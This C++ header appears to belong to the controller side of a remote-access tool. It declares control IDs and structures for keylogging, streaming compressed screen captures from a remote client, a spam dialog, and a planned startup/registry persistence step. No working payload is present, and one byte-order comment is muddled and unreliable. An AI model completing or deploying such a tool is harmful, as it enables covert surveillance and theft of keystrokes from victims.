//NOTE put in the startup/regedit thing
//NOTE gotta make a function to handle errors
#include <windows.h>
#include <windowsx.h>
#include <string>
#include <winsock2.h>
#include <sstream>
#include <map>
#include <stdio.h>
#include <ctime>
#include <zlib.h>

#pragma pack(1)

//#include <wchar.h>
#include "resource.h"
#define WIN32_LEAN_AND_MEAN
#define BUFFER_SZ 5000

//custom defined id's I have them here since my resource editor cant edit things in main window. You may or may not need so modify as needed
#define MAIN_WINDOW_BUTTONMSG1  4043
#define CONNECT_TO_HOST         1997
#define IPADDR_EDIT             1819
#define PORTNUMBER_EDIT         1443
#define SYNCSOCKET              3485
#define DISCONNECT_HOST         1047
#define CLIENTMESSAGE_SYNC      1997
#define STATIC_STATUS_TEXT      99999
#define KEYLOG_WINDOW           4328
#define CHK_KEYLOG              4023
#define UNCHK_KEYLOG            9121
#define STREAM_BUTTON           3117
#define STREAM_STATUS           39913
#define STOP_STREAM             1929

//the Proper way to use namespaces;
using std::stringstream;
using std::map;
using std::string;

//Function definition :3
LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);
BOOL CALLBACK AboutDlgProc(HWND, UINT, WPARAM , LPARAM);
BOOL CALLBACK EmailMeDlg(HWND , UINT, WPARAM , LPARAM);
BOOL CALLBACK ESpamDlg(HWND, UINT, WPARAM, LPARAM);
BOOL CALLBACK MsgBoxTrigger(HWND ,UINT , WPARAM, LPARAM);

float GetDlgItemFloat(HWND, int);
int HandleError(int);

//map and enumeration for client messages in case the server talks back to the client
enum CLIENT_MESSAGES{KEYLOG, STREAMPICTURE, BITMAPHDR, BITMAPDATA, BITMAPEND};

extern map<string, CLIENT_MESSAGES> MESSAGEMAP;


extern struct sockaddr_in clientsocket;
extern SOCKET sa;
extern stringstream KEYLOG_STREAM;
//extern char server_buffer[5000];
extern string client_operator, client_operand;
extern string keylog;

typedef struct IMAGE_PKT_HEADER{

    //make sure to ntohl the ints.
    BITMAPINFOHEADER bitmaphdr;
    int packet_expected;
    int origx, origy;
    ULONG uncompressed_size; //uncompressed
    ULONG compressed_Size; //compressed

}IMAGE_PKT_HEADER;


//for the BITMAPINFOHEADER i use NTOHL right? not HTONL
//NTOHL to encode, HTONL to decode

typedef struct PKT{

    char command[12];
    unsigned char data[4096];

}PKT;

    extern bool pkt_complete;
    extern int bitcounter;

    extern unsigned char *bitmapbuf, *bitmapbuf_compressed;

    extern IMAGE_PKT_HEADER hdrpkt;
    extern BITMAPINFOHEADER bi;
    extern HDC handle_WindowDC;
    extern PAINTSTRUCT paintstruct;

